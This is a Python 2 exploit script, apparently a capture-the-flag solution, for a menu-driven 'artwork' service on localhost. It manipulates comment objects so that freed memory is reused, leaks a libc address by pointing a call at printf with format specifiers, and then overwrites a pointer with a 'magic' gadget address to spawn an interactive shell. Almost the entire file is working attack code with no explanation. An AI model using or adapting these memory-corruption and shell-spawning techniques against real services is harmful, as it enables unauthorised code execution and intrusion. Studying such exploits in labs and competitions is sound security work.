import struct
import socket
import telnetlib
import hexdump
def read_until(s,string):
	r = ""
	while not r.endswith(string):
			tmp = s.recv(1)
			if not tmp: break
			r += tmp
	return r
def add_artwork(s,dat):
	s.send("1\n")
	read_until(s,">")
	s.send("0\n")
	read_until(s,">>>")
	s.send(dat)
	read_until(s,">")
def leak(s):
	leak_offset = 0x1ab3c4
	read_until(s,">")
	add_artwork(s,"AAAA\n")
	s.send('3\n') #select 1
	read_until(s,'>')
	s.send('1\n')
	read_until(s,'>')
	s.send('1\n') # add comment
	read_until(s,'>')
	s.send('comment\n')
	read_until(s,'>') 
	s.send('1\n') # add comment
	read_until(s,'>')
	s.send('comment\n')
	read_until(s,'>') 
	s.send('0\n')
	read_until(s,'>')
	add_artwork(s,"BBBB\n")
	s.send('3\n') #select 1
	read_until(s,'>')
	s.send('1\n')
	read_until(s,'>')
	s.send('2\n') # remove all comment
	read_until(s,'>')
	s.send('1\n') # add comment
	read_until(s,'>')
	s.send('comment\n')
	read_until(s,'>') 
	s.send('0\n')
	read_until(s,'>')
	s.send('3\n') # select 2
	read_until(s,'>')
	s.send('2\n')
	read_until(s,'>')
	s.send('2\n') # remove all comment
	read_until(s,'>')
	s.send('1\n') # add comment
	read_until(s,'>')
	dat = ""
	dat += struct.pack("<I",0x8048420) # printf_plt
	dat += "%x"*7+"BBBBB%xK"
	s.send(dat+"\n")
	read_until(s,'>')
	s.send('0\n')
	read_until(s,'>')
	s.send('3\n') #select 1
	read_until(s,'>')
	s.send('1\n')
	read_until(s,'>')
	s.send('2\n') # remove all comment
	read_until(s,'>')
	s.send('1\n') # add comment
	read_until(s,'>')
	s.send("H"*0xfc)
	read_until(s,'>')
	s.send('0\n')
	read_until(s,'>')
	s.send('3\n')
	read_until(s,'>')
	s.send('2\n')
	read_until(s,'>')
	s.send('3\n')
	libc_base = int(read_until(s,"K")[-9:-1],16) - leak_offset
	return libc_base
def pwn(s,libc_base):
	magic = libc_base+0x00401B3
	read_until(s,">")
	s.send('0\n')
	read_until(s,'>')
	add_artwork(s,"AAAA\n")
	s.send('3\n') #select 3
	read_until(s,'>')
	s.send('3\n')
	read_until(s,'>')
	s.send('1\n') # add comment
	read_until(s,'>')
	s.send('comment\n')
	read_until(s,'>') 
	s.send('1\n') # add comment
	read_until(s,'>')
	s.send('comment\n')
	read_until(s,'>') 
	s.send('0\n')
	read_until(s,'>')
	add_artwork(s,"BBBB\n")
	s.send('3\n') #select 3
	read_until(s,'>')
	s.send('3\n')
	read_until(s,'>')
	s.send('2\n') # remove all comment
	read_until(s,'>')
	s.send('1\n') # add comment
	read_until(s,'>')
	s.send('comment\n')
	read_until(s,'>') 
	s.send('0\n')
	read_until(s,'>')
	s.send('3\n') # select 4
	read_until(s,'>')
	s.send('4\n')
	read_until(s,'>')
	s.send('2\n') # remove all comment
	read_until(s,'>')
	s.send('1\n') # add comment
	read_until(s,'>')
	dat = ""
	dat += struct.pack("<I",magic) # magic : get shell
	s.send(dat+"\n")
	read_until(s,'>')
	s.send('0\n')
	read_until(s,'>')
	s.send('3\n') #select 3
	read_until(s,'>')
	s.send('3\n')
	read_until(s,'>')
	s.send('2\n') # remove all comment
	read_until(s,'>')
	s.send('1\n') # add comment
	read_until(s,'>')
	s.send("H"*0xfc)
	read_until(s,'>')
	s.send('0\n')
	read_until(s,'>')
	s.send('3\n') # select 4
	read_until(s,'>')
	s.send('4\n')
	read_until(s,'>')
	s.send('3\n')
s = socket.create_connection(["localhost",4000])
raw_input('')
libc_base = leak(s)
print "[+] libc_base : {:02x}".format(libc_base)
pwn(s,libc_base)
print "[+] get shell"
t = telnetlib.Telnet()
t.sock = s
t.interact()
